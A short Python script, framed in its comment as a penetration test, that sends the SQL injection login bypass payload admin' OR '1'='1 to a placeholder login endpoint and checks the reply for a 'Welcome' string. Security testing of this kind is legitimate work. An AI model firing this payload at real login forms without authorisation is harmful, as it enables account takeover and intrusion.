import requests

# Simple penetration testing script to check for SQL injection vulnerability
url = "https://example.com/api/login"
payload = {
    "username": "admin' OR '1'='1",
    "password": "password"
}

response = requests.post(url, data=payload)

if "Welcome" in response.text:
    print("Vulnerability found: SQL Injection possible!")
else:
    print("No vulnerability found.")
